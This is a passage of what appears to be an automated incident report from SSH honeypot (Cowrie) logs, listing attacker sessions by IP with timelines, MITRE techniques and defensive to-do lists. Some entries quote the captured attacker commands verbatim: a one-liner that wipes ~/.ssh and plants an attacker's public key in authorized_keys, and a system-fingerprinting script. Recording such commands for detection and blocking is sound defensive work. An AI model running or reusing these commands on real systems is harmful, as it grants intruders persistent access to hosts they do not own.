| `2026-07-28 13:52:42` | `cowrie.command.input` |
| `2026-07-28 13:52:42` | `cowrie.command.input` |
| `2026-07-28 13:52:42` | `cowrie.command.input` |
| `2026-07-28 13:52:42` | `cowrie.command.input` |
| `2026-07-28 13:52:42` | `cowrie.command.success` |
| `2026-07-28 13:52:42` | `cowrie.command.input` |
| `2026-07-28 13:52:42` | `cowrie.command.input` |
| `2026-07-28 13:52:42` | `cowrie.command.input` |
| `2026-07-28 13:52:42` | `cowrie.command.input` |
| `2026-07-28 13:52:42` | `cowrie.log.closed` |
| `2026-07-28 13:52:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aad78efb3b0c

| Field | Detail |
|---|---|
| **Source IP** | `172.160.227[.]37` |
| **First Seen** | 2026-07-28 13:53 |
| **Last Seen** | 2026-07-28 13:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:53:01` | `cowrie.session.connect` |
| `2026-07-28 13:53:01` | `cowrie.client.version` |
| `2026-07-28 13:53:01` | `cowrie.client.kex` |
| `2026-07-28 13:53:02` | `cowrie.login.success` |
| `2026-07-28 13:53:03` | `cowrie.session.params` |
| `2026-07-28 13:53:03` | `cowrie.command.input` |
| `2026-07-28 13:53:03` | `cowrie.command.failed` |
| `2026-07-28 13:53:03` | `cowrie.log.closed` |
| `2026-07-28 13:53:04` | `cowrie.session.params` |
| `2026-07-28 13:53:04` | `cowrie.command.input` |
| `2026-07-28 13:53:04` | `cowrie.session.file_download` |
| `2026-07-28 13:53:04` | `cowrie.log.closed` |
| `2026-07-28 13:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.160.227[.]37` to AbuseIPDB if not already reported
- [ ] Block `172.160.227[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2056696de51e

| Field | Detail |
|---|---|
| **Source IP** | `172.160.227[.]37` |
| **First Seen** | 2026-07-28 13:53 |
| **Last Seen** | 2026-07-28 13:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:53:04` | `cowrie.session.connect` |
| `2026-07-28 13:53:04` | `cowrie.client.version` |
| `2026-07-28 13:53:04` | `cowrie.client.kex` |
| `2026-07-28 13:53:04` | `cowrie.login.success` |
| `2026-07-28 13:53:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.160.227[.]37` to AbuseIPDB if not already reported
- [ ] Block `172.160.227[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb201d07b935

| Field | Detail |
|---|---|
| **Source IP** | `172.160.227[.]37` |
| **First Seen** | 2026-07-28 13:53 |
| **Last Seen** | 2026-07-28 13:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:53:05` | `cowrie.session.connect` |
| `2026-07-28 13:53:05` | `cowrie.client.version` |
| `2026-07-28 13:53:05` | `cowrie.client.kex` |
| `2026-07-28 13:53:05` | `cowrie.login.success` |
| `2026-07-28 13:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.160.227[.]37` to AbuseIPDB if not already reported
- [ ] Block `172.160.227[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-271b6cc26b2b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:53 |
| **Last Seen** | 2026-07-28 13:53 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:53:45` | `cowrie.session.connect` |
| `2026-07-28 13:53:45` | `cowrie.client.version` |
| `2026-07-28 13:53:45` | `cowrie.client.kex` |
| `2026-07-28 13:53:49` | `cowrie.login.success` |
| `2026-07-28 13:53:52` | `cowrie.session.params` |
| `2026-07-28 13:53:52` | `cowrie.command.input` |
| `2026-07-28 13:53:52` | `cowrie.command.input` |
| `2026-07-28 13:53:52` | `cowrie.command.input` |
| `2026-07-28 13:53:52` | `cowrie.command.input` |
| `2026-07-28 13:53:52` | `cowrie.command.input` |
| `2026-07-28 13:53:52` | `cowrie.command.success` |
| `2026-07-28 13:53:52` | `cowrie.command.input` |
| `2026-07-28 13:53:52` | `cowrie.command.input` |
| `2026-07-28 13:53:52` | `cowrie.command.input` |
| `2026-07-28 13:53:52` | `cowrie.command.input` |
| `2026-07-28 13:53:54` | `cowrie.log.closed` |
| `2026-07-28 13:53:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8862b1b6c60b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:54 |
| **Last Seen** | 2026-07-28 13:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:54:56` | `cowrie.session.connect` |
| `2026-07-28 13:54:57` | `cowrie.client.version` |
| `2026-07-28 13:54:57` | `cowrie.client.kex` |
| `2026-07-28 13:55:01` | `cowrie.login.success` |
| `2026-07-28 13:55:04` | `cowrie.session.params` |
| `2026-07-28 13:55:04` | `cowrie.command.input` |
| `2026-07-28 13:55:04` | `cowrie.command.input` |
| `2026-07-28 13:55:04` | `cowrie.command.input` |
| `2026-07-28 13:55:04` | `cowrie.command.input` |
| `2026-07-28 13:55:04` | `cowrie.command.input` |
| `2026-07-28 13:55:04` | `cowrie.command.success` |
| `2026-07-28 13:55:04` | `cowrie.command.input` |
| `2026-07-28 13:55:04` | `cowrie.command.input` |
| `2026-07-28 13:55:04` | `cowrie.command.input` |
| `2026-07-28 13:55:04` | `cowrie.command.input` |
| `2026-07-28 13:55:05` | `cowrie.log.closed` |
| `2026-07-28 13:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c2efedf24f7

| Field | Detail |
|---|---|
| **Source IP** | `103.84.236[.]242` |
| **First Seen** | 2026-07-28 13:55 |
| **Last Seen** | 2026-07-28 13:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:55:28` | `cowrie.session.connect` |
| `2026-07-28 13:55:28` | `cowrie.client.version` |
| `2026-07-28 13:55:28` | `cowrie.client.kex` |
| `2026-07-28 13:55:29` | `cowrie.login.success` |
| `2026-07-28 13:55:31` | `cowrie.session.params` |
| `2026-07-28 13:55:31` | `cowrie.command.input` |
| `2026-07-28 13:55:31` | `cowrie.command.failed` |
| `2026-07-28 13:55:31` | `cowrie.log.closed` |
| `2026-07-28 13:55:32` | `cowrie.session.params` |
| `2026-07-28 13:55:32` | `cowrie.command.input` |
| `2026-07-28 13:55:32` | `cowrie.session.file_download` |
| `2026-07-28 13:55:32` | `cowrie.log.closed` |
| `2026-07-28 13:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.84.236[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.84.236[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-707340ede155

| Field | Detail |
|---|---|
| **Source IP** | `103.84.236[.]242` |
| **First Seen** | 2026-07-28 13:55 |
| **Last Seen** | 2026-07-28 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:55:32` | `cowrie.session.connect` |
| `2026-07-28 13:55:32` | `cowrie.client.version` |
| `2026-07-28 13:55:33` | `cowrie.client.kex` |
| `2026-07-28 13:55:34` | `cowrie.login.success` |
| `2026-07-28 13:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.84.236[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.84.236[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee568c269802

| Field | Detail |
|---|---|
| **Source IP** | `103.84.236[.]242` |
| **First Seen** | 2026-07-28 13:55 |
| **Last Seen** | 2026-07-28 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:55:34` | `cowrie.session.connect` |
| `2026-07-28 13:55:34` | `cowrie.client.version` |
| `2026-07-28 13:55:35` | `cowrie.client.kex` |
| `2026-07-28 13:55:36` | `cowrie.login.success` |
| `2026-07-28 13:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.84.236[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.84.236[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-302cca16fcb1

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:56 |
| **Last Seen** | 2026-07-28 13:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:56:09` | `cowrie.session.connect` |
| `2026-07-28 13:56:10` | `cowrie.client.version` |
| `2026-07-28 13:56:10` | `cowrie.client.kex` |
| `2026-07-28 13:56:13` | `cowrie.login.success` |
| `2026-07-28 13:56:16` | `cowrie.session.params` |
| `2026-07-28 13:56:16` | `cowrie.command.input` |
| `2026-07-28 13:56:16` | `cowrie.command.input` |
| `2026-07-28 13:56:16` | `cowrie.command.input` |
| `2026-07-28 13:56:16` | `cowrie.command.input` |
| `2026-07-28 13:56:16` | `cowrie.command.input` |
| `2026-07-28 13:56:16` | `cowrie.command.success` |
| `2026-07-28 13:56:16` | `cowrie.command.input` |
| `2026-07-28 13:56:16` | `cowrie.command.input` |
| `2026-07-28 13:56:16` | `cowrie.command.input` |
| `2026-07-28 13:56:16` | `cowrie.command.input` |
| `2026-07-28 13:56:17` | `cowrie.log.closed` |
| `2026-07-28 13:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcb0fca42e8c

| Field | Detail |
|---|---|
| **Source IP** | `113.140.95[.]250` |
| **First Seen** | 2026-07-28 13:56 |
| **Last Seen** | 2026-07-28 13:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:56:21` | `cowrie.session.connect` |
| `2026-07-28 13:56:22` | `cowrie.client.version` |
| `2026-07-28 13:56:22` | `cowrie.client.kex` |
| `2026-07-28 13:56:25` | `cowrie.login.success` |
| `2026-07-28 13:56:26` | `cowrie.direct-tcpip.request` |
| `2026-07-28 13:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.140.95[.]250` to AbuseIPDB if not already reported
- [ ] Block `113.140.95[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbd7e80b823a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:57 |
| **Last Seen** | 2026-07-28 13:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:57:22` | `cowrie.session.connect` |
| `2026-07-28 13:57:23` | `cowrie.client.version` |
| `2026-07-28 13:57:23` | `cowrie.client.kex` |
| `2026-07-28 13:57:26` | `cowrie.login.success` |
| `2026-07-28 13:57:28` | `cowrie.session.params` |
| `2026-07-28 13:57:28` | `cowrie.command.input` |
| `2026-07-28 13:57:28` | `cowrie.command.input` |
| `2026-07-28 13:57:28` | `cowrie.command.input` |
| `2026-07-28 13:57:28` | `cowrie.command.input` |
| `2026-07-28 13:57:28` | `cowrie.command.input` |
| `2026-07-28 13:57:28` | `cowrie.command.success` |
| `2026-07-28 13:57:28` | `cowrie.command.input` |
| `2026-07-28 13:57:28` | `cowrie.command.input` |
| `2026-07-28 13:57:28` | `cowrie.command.input` |
| `2026-07-28 13:57:28` | `cowrie.command.input` |
| `2026-07-28 13:57:29` | `cowrie.log.closed` |
| `2026-07-28 13:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ddce862cd82

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:58 |
| **Last Seen** | 2026-07-28 13:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:58:33` | `cowrie.session.connect` |
| `2026-07-28 13:58:34` | `cowrie.client.version` |
| `2026-07-28 13:58:34` | `cowrie.client.kex` |
| `2026-07-28 13:58:38` | `cowrie.login.success` |
| `2026-07-28 13:58:40` | `cowrie.session.params` |
| `2026-07-28 13:58:40` | `cowrie.command.input` |
| `2026-07-28 13:58:40` | `cowrie.command.input` |
| `2026-07-28 13:58:40` | `cowrie.command.input` |
| `2026-07-28 13:58:40` | `cowrie.command.input` |
| `2026-07-28 13:58:40` | `cowrie.command.input` |
| `2026-07-28 13:58:41` | `cowrie.command.success` |
| `2026-07-28 13:58:41` | `cowrie.command.input` |
| `2026-07-28 13:58:41` | `cowrie.command.input` |
| `2026-07-28 13:58:41` | `cowrie.command.input` |
| `2026-07-28 13:58:41` | `cowrie.command.input` |
| `2026-07-28 13:58:41` | `cowrie.log.closed` |
| `2026-07-28 13:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58a3a7e266f8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:59 |
| **Last Seen** | 2026-07-28 13:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:59:43` | `cowrie.session.connect` |
| `2026-07-28 13:59:43` | `cowrie.client.version` |
| `2026-07-28 13:59:43` | `cowrie.client.kex` |
| `2026-07-28 13:59:47` | `cowrie.login.success` |
| `2026-07-28 13:59:49` | `cowrie.session.params` |
| `2026-07-28 13:59:49` | `cowrie.command.input` |
| `2026-07-28 13:59:49` | `cowrie.command.input` |
| `2026-07-28 13:59:49` | `cowrie.command.input` |
| `2026-07-28 13:59:49` | `cowrie.command.input` |
| `2026-07-28 13:59:49` | `cowrie.command.input` |
| `2026-07-28 13:59:49` | `cowrie.command.success` |
| `2026-07-28 13:59:49` | `cowrie.command.input` |
| `2026-07-28 13:59:49` | `cowrie.command.input` |
| `2026-07-28 13:59:49` | `cowrie.command.input` |
| `2026-07-28 13:59:49` | `cowrie.command.input` |
| `2026-07-28 13:59:50` | `cowrie.log.closed` |
| `2026-07-28 13:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c734f880f7b4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:00 |
| **Last Seen** | 2026-07-28 14:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:00:53` | `cowrie.session.connect` |
| `2026-07-28 14:00:53` | `cowrie.client.version` |
| `2026-07-28 14:00:53` | `cowrie.client.kex` |
| `2026-07-28 14:00:57` | `cowrie.login.success` |
| `2026-07-28 14:00:59` | `cowrie.session.params` |
| `2026-07-28 14:00:59` | `cowrie.command.input` |
| `2026-07-28 14:00:59` | `cowrie.command.input` |
| `2026-07-28 14:00:59` | `cowrie.command.input` |
| `2026-07-28 14:00:59` | `cowrie.command.input` |
| `2026-07-28 14:00:59` | `cowrie.command.input` |
| `2026-07-28 14:00:59` | `cowrie.command.success` |
| `2026-07-28 14:00:59` | `cowrie.command.input` |
| `2026-07-28 14:00:59` | `cowrie.command.input` |
| `2026-07-28 14:00:59` | `cowrie.command.input` |
| `2026-07-28 14:00:59` | `cowrie.command.input` |
| `2026-07-28 14:01:00` | `cowrie.log.closed` |
| `2026-07-28 14:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aee6d9771eff

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:02 |
| **Last Seen** | 2026-07-28 14:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:02:05` | `cowrie.session.connect` |
| `2026-07-28 14:02:06` | `cowrie.client.version` |
| `2026-07-28 14:02:06` | `cowrie.client.kex` |
| `2026-07-28 14:02:09` | `cowrie.login.success` |
| `2026-07-28 14:02:11` | `cowrie.session.params` |
| `2026-07-28 14:02:11` | `cowrie.command.input` |
| `2026-07-28 14:02:11` | `cowrie.command.input` |
| `2026-07-28 14:02:11` | `cowrie.command.input` |
| `2026-07-28 14:02:11` | `cowrie.command.input` |
